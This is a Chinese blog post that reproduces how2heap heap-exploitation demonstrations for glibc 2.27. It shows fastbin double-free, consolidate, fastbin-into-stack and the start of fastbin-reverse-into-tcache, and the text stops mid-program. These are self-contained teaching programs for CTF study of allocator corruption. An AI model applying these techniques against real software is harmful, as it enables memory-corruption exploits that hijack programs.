<!DOCTYPE html>
<html lang="zh-CN" color-mode="light">

  <head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <meta name="keywords" content="" />
  <meta name="author" content="Closure" />
  <meta name="description" content="" />
  <meta name="google-site-verification" content="ume8wxFIzFnN-uS2NK6TLbEnB0OL8U3QYLpG-0v0NPM" />
  
  
  <title>
    
      How2heap Glibc2.27 
      
      
      |
    
     Closure
  </title>

  
    <link rel="apple-touch-icon" href="/images/favicon.png">
    <link rel="icon" href="/images/favicon.png">
  

  <!-- Raleway-Font -->
  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">

  <!-- hexo site css -->
  <link rel="stylesheet" href="/css/main.css" />
  <link rel="stylesheet" href="//at.alicdn.com/t/font_1886449_67xjft27j1l.css" />
  <!-- 代码块风格 -->
  

  <!-- jquery3.3.1 -->
  
    <script defer type="text/javascript" src="/plugins/jquery.min.js"></script>
  

  <!-- fancybox -->
  
    <link href="/plugins/jquery.fancybox.min.css" rel="stylesheet">
    <script defer type="text/javascript" src="/plugins/jquery.fancybox.min.js"></script>
  
  
<script src="/js/fancybox.js"></script>


  

  
    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
  

  <script>
    var html = document.documentElement
    const colorMode = localStorage.getItem('color-mode')
    if (colorMode) {
      document.documentElement.setAttribute('color-mode', colorMode)
    }
  </script>
<meta name="generator" content="Hexo 6.3.0"></head>


  <body>
    <div id="app">
      <div class="header">
  <div class="avatar">
    <a href="/">
      <!-- 头像取消懒加载，添加no-lazy -->
      
        <img src="/images/avatar.png" alt="">
      
    </a>
    <div class="nickname"><a href="/">Closure</a></div>
  </div>
  <div class="navbar">
    <ul>
      
        <li class="nav-item" data-path="/">
          <a href="/">主页</a>
        </li>
      
        <li class="nav-item" data-path="/archives/">
          <a href="/archives/">归档</a>
        </li>
      
        <li class="nav-item" data-path="/tags/">
          <a href="/tags/">Tags</a>
        </li>
      
        <li class="nav-item" data-path="/friends/">
          <a href="/friends/">Friends</a>
        </li>
      
        <li class="nav-item" data-path="/about/">
          <a href="/about/">关于我</a>
        </li>
      
    </ul>
  </div>
</div>


<script src="/js/activeNav.js"></script>



      <div class="flex-container">
        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->


  <!-- LaTex Display -->

  
    <script async type="text/javascript" src="/plugins/mathjax/tex-chtml.js"></script>
  
  <script>
    MathJax = {
      tex: {
        inlineMath: [['$', '$'], ['\\(', '\\)']]
      }
    }
  </script>





  <!-- clipboard -->

  
    <script async type="text/javascript" src="/plugins/clipboard.min.js"></script>
  
  
<script src="/js/codeCopy.js"></script>







  

  

  

  
  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
  <div class="container post-details" id="post-details">
    <div class="post-content">
      <div class="post-title">How2heap Glibc2.27</div>
      <div class="post-attach">
        <span class="post-pubtime">
          <i class="iconfont icon-updatetime mr-10" title="更新时间"></i>
          2022-06-29 09:09:39
        </span>
        
              <span class="post-tags">
                <i class="iconfont icon-tags mr-10" title="标签"></i>
                
                <span class="span--tag mr-8">
                  <a href="/tags/pwn-%E5%A0%86/" title="pwn_堆">
                    #pwn_堆
                  </a>
                </span>
                
              </span>
          
      </div>
      <div class="markdown-body">
        <h1 id="Glibc2-27"><a href="#Glibc2-27" class="headerlink" title="Glibc2.27"></a>Glibc2.27</h1><pre class="language-bash" data-language="bash"><code class="language-bash">gcc <span class="token parameter variable">-g</span> xxx.c <span class="token parameter variable">-o</span> clo

patchelf --set-interpreter ~/tools/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/ld-2.27.so --set-rpath ~/tools/glibc-all-in-one/libs/2.27-3ubuntu1_amd64 clo</code></pre>



<h3 id="fastbin-dup-c"><a href="#fastbin-dup-c" class="headerlink" title="fastbin_dup.c"></a>fastbin_dup.c</h3><pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;assert.h></span></span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
	<span class="token function">setbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"This file demonstrates a simple double-free attack with fastbins.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Fill up tcache first.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">void</span> <span class="token operator">*</span>ptrs<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
	<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span><span class="token number">8</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		ptrs<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>
	<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span><span class="token number">7</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		<span class="token function">free</span><span class="token punctuation">(</span>ptrs<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>

	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Allocating 3 buffers.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">int</span> <span class="token operator">*</span>a <span class="token operator">=</span> <span class="token function">calloc</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">int</span> <span class="token operator">*</span>b <span class="token operator">=</span> <span class="token function">calloc</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">int</span> <span class="token operator">*</span>c <span class="token operator">=</span> <span class="token function">calloc</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"1st calloc(1, 8): %p\n"</span><span class="token punctuation">,</span> a<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"2nd calloc(1, 8): %p\n"</span><span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"3rd calloc(1, 8): %p\n"</span><span class="token punctuation">,</span> c<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Freeing the first one...\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">free</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"If we free %p again, things will crash because %p is at the top of the free list.\n"</span><span class="token punctuation">,</span> a<span class="token punctuation">,</span> a<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token comment">// free(a);</span>

	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"So, instead, we'll free %p.\n"</span><span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">free</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Now, we can free %p again, since it's not the head of the free list.\n"</span><span class="token punctuation">,</span> a<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">free</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Now the free list has [ %p, %p, %p ]. If we malloc 3 times, we'll get %p twice!\n"</span><span class="token punctuation">,</span> a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> a<span class="token punctuation">,</span> a<span class="token punctuation">)</span><span class="token punctuation">;</span>
	a <span class="token operator">=</span> <span class="token function">calloc</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	b <span class="token operator">=</span> <span class="token function">calloc</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	c <span class="token operator">=</span> <span class="token function">calloc</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"1st calloc(1, 8): %p\n"</span><span class="token punctuation">,</span> a<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"2nd calloc(1, 8): %p\n"</span><span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"3rd calloc(1, 8): %p\n"</span><span class="token punctuation">,</span> c<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token function">assert</span><span class="token punctuation">(</span>a <span class="token operator">==</span> c<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<p>首先申请7个chunk释放掉填满tcache，再申请3个chunk</p>
<p>首先释放chunk a，再释放chunk b，再次释放chunk a实现double free</p>
<h3 id="fastbin-dup-consolidate-c"><a href="#fastbin-dup-consolidate-c" class="headerlink" title="fastbin_dup_consolidate.c"></a>fastbin_dup_consolidate.c</h3><pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;assert.h></span></span>

<span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	<span class="token comment">// reference: https://valsamaras.medium.com/the-toddlers-introduction-to-heap-exploitation-fastbin-dup-consolidate-part-4-2-ce6d68136aa8</span>
	<span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"This is a powerful technique that bypasses the double free check in tcachebin."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Fill up the tcache list to force the fastbin usage...\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token keyword">void</span> <span class="token operator">*</span>ptr<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

	<span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">7</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>
		ptr<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x40</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">7</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>
		<span class="token function">free</span><span class="token punctuation">(</span>ptr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token keyword">void</span><span class="token operator">*</span> p1 <span class="token operator">=</span> <span class="token function">calloc</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0x40</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  	<span class="token function">free</span><span class="token punctuation">(</span>p1<span class="token punctuation">)</span><span class="token punctuation">;</span>

  	<span class="token keyword">void</span><span class="token operator">*</span> p3 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x400</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token function">assert</span><span class="token punctuation">(</span>p1 <span class="token operator">==</span> p3<span class="token punctuation">)</span><span class="token punctuation">;</span>

  	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Triggering the double free vulnerability!\n\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">free</span><span class="token punctuation">(</span>p1<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//fastbin中此时无p1，再次释放实现double free</span>

	<span class="token keyword">void</span> <span class="token operator">*</span>p4 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x400</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token function">assert</span><span class="token punctuation">(</span>p4 <span class="token operator">==</span> p3<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"The double free added the chunk referenced by p1 \n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"to the tcache thus the next similar-size malloc will\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"point to p3: p3=%p, p4=%p\n\n"</span><span class="token punctuation">,</span>p3<span class="token punctuation">,</span> p4<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<p>与2.23的区别为需要先将tcache填满</p>
<h3 id="fastbin-dup-into-stack-c"><a href="#fastbin-dup-into-stack-c" class="headerlink" title="fastbin_dup_into_stack.c"></a>fastbin_dup_into_stack.c</h3><pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;assert.h></span></span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
	<span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"This file extends on fastbin_dup.c by tricking calloc into\n"</span>
	       <span class="token string">"returning a pointer to a controlled location (in this case, the stack).\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>


	<span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span><span class="token string">"Fill up tcache first.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token keyword">void</span> <span class="token operator">*</span>ptrs<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

	<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span><span class="token number">7</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		ptrs<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>
	<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span><span class="token number">7</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		<span class="token function">free</span><span class="token punctuation">(</span>ptrs<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>


	<span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token keyword">long</span> stack_var<span class="token punctuation">;</span>

	<span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"The address we want calloc() to return is %p.\n"</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>stack_var<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Allocating 3 buffers.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">int</span> <span class="token operator">*</span>a <span class="token operator">=</span> <span class="token function">calloc</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">int</span> <span class="token operator">*</span>b <span class="token operator">=</span> <span class="token function">calloc</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">int</span> <span class="token operator">*</span>c <span class="token operator">=</span> <span class="token function">calloc</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"1st calloc(1,8): %p\n"</span><span class="token punctuation">,</span> a<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"2nd calloc(1,8): %p\n"</span><span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"3rd calloc(1,8): %p\n"</span><span class="token punctuation">,</span> c<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Freeing the first one...\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//First call to free will add a reference to the fastbin</span>
	<span class="token function">free</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"If we free %p again, things will crash because %p is at the top of the free list.\n"</span><span class="token punctuation">,</span> a<span class="token punctuation">,</span> a<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"So, instead, we'll free %p.\n"</span><span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">free</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token comment">//Calling free(a) twice renders the program vulnerable to Double Free</span>

	<span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Now, we can free %p again, since it's not the head of the free list.\n"</span><span class="token punctuation">,</span> a<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">free</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//double free</span>

	<span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Now the free list has [ %p, %p, %p ]. "</span>
		<span class="token string">"We'll now carry out our attack by modifying data at %p.\n"</span><span class="token punctuation">,</span> a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> a<span class="token punctuation">,</span> a<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token keyword">long</span> <span class="token operator">*</span>d <span class="token operator">=</span> <span class="token function">calloc</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	stack_var <span class="token operator">=</span> <span class="token number">0x20</span><span class="token punctuation">;</span>

	<span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Now, we overwrite the first 8 bytes of the data at %p to point right before the 0x20.\n"</span><span class="token punctuation">,</span> a<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token comment">/*VULNERABILITY*/</span>
	<span class="token operator">*</span>d <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token keyword">long</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>stack_var<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>d<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token comment">/*VULNERABILITY*/</span>

	<span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"3rd calloc(1,8): %p, putting the stack address on the free list\n"</span><span class="token punctuation">,</span> <span class="token function">calloc</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token keyword">void</span> <span class="token operator">*</span>p <span class="token operator">=</span> <span class="token function">calloc</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"4th calloc(1,8): %p\n"</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">assert</span><span class="token punctuation">(</span>p <span class="token operator">==</span> <span class="token number">8</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>stack_var<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token comment">// assert((long)__builtin_return_address(0) == *(long *)p);</span>
<span class="token punctuation">&#125;</span></code></pre>

<p>与2.23的区别为需要先将tcache填满</p>
<h3 id="fastbin-reverse-into-tcache-c"><a href="#fastbin-reverse-into-tcache-c" class="headerlink" title="fastbin_reverse_into_tcache.c"></a>fastbin_reverse_into_tcache.c</h3><pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;assert.h></span></span>

<span class="token keyword">const</span> <span class="token class-name">size_t</span> allocsize <span class="token operator">=</span> <span class="token number">0x40</span><span class="token punctuation">;</span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
  <span class="token function">setbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token function">printf</span><span class="token punctuation">(</span>
    <span class="token string">"\n"</span>
    <span class="token string">"This attack is intended to have a similar effect to the unsorted_bin_attack,\n"</span>
    <span class="token string">"except it works with a small allocation size (allocsize &lt;= 0x78).\n"</span>
    <span class="token string">"The goal is to set things up so that a call to malloc(allocsize) will write\n"</span>
    <span class="token string">"a large unsigned value to the stack.\n\n"</span>
  <span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token comment">// Allocate 14 times so that we can free later.</span>
  <span class="token keyword">char</span><span class="token operator">*</span> ptrs<span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token class-name">size_t</span> i<span class="token punctuation">;</span>
  <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">14</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    ptrs<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span>allocsize<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>

  <span class="token function">printf</span><span class="token punctuation">(</span>
    <span class="token string">"First we need to free(allocsize) at least 7 times to fill the tcache.\n"</span>
    <span class="token string">"(More than 7 times works fine too.)\n\n"</span>
  <span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token comment">// Fill the tcache.</span>
  <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">7</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token function">free</span><span class="token punctuation">(</span>ptrs<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>

  <span class="token keyword">char</span><span class="token operator">*</span> victim <span class="token operator">=</span> ptrs<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span>
    <span class="token string">"The next pointer that we free is the chunk that we're going to corrupt: %p\n"</span>
    <span class="token string">"It doesn't matter if we corrupt it now or later. Because the tcache is\n"</span>
    <span class="token string">"already full, it will go in the fastbin.\n\n"</span><span class="token punctuation">,</span>
    victim
  <span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">free</span><span class="token punctuation">(</span>victim<span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token function">printf</span><span class="token punctuation">(</span>
    <span class="token string">"Next we need to free between 1 and 6 more pointers. These will also go\n"</span>
    <span class="token string">"in the fastbin. If the stack address that we want to overwrite is not zero\n"</span>
    <span class="token string">"then we need to free exactly 6 more pointers, otherwise the attack will\n"</span>
    <span class="token string">"cause a segmentation fault. But if the value on the stack is zero then\n"</span>
    <span class="token string">"a single free is sufficient.\n\n"</span>
  <span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token comment">// Fill the fastbin.</span>
  <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">14</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token function">free</span><span class="token punctuation">(</span>ptrs<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>

  <span class="token comment">// Create an array on the stack and initialize it with garbage.</span>
  <span class="token class-name">size_t</span> stack_var<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
